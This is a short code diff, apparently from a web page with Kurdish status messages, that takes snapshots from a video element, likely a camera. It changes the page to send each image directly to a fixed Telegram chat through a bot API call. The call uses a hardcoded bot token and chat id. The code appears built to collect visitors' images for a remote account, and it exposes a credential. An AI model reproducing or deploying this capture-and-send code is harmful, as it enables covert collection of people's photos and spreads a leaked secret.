@@ -27,30 +27,19 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             canvas.toBlob(blob => {
-              statusEl.innerText = "ئامادەکردنی وێنە...";
+              statusEl.innerText = "خەریکی ناردنی وێنەیە بۆ تلگرام...";
               
               const formData = new FormData();
-              formData.append('file', blob, 'snapshot.jpg');
+              formData.append('chat_id', '6539379136');
+              formData.append('photo', blob, 'snapshot.jpg');
 
-              // ناردنی ڕاستەوخۆ بۆ telegra.ph بێ هیچ پرۆکسی و کێشەیەک
-              fetch('https://telegra.ph/upload', {
+              // ناردنی ڕاستەوخۆ بۆ سێرڤەری تلگرام بێ هیچ پرۆکسی و ناوەندێک
+              const token = "8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw";
+              const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+
+              fetch(telegramUrl, {
                 method: 'POST',
                 body: formData
-              })
-              .then(res => res.json())
-              .then(data => {
-                if (data && data[0] && data[0].src) {
-                  const imageUrl = 'https://telegra.ph' + data[0].src;
-                  statusEl.innerText = "ناردنی بۆ تلگرام...";
-                  
-                  const token = "8699050179:AAGeUEWCavf8zBFg8dHxoQb4YU1ofp0T3Cw";
-                  const chatId = "6539379136";
-                  const telegramUrl = `https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}`;
-
-                  return fetch(telegramUrl);
-                } else {
-                  throw new Error("هەڵە لە بارکردنی وێنە");
-                }
               })
               .then(response => response.json())
               .then(data => {
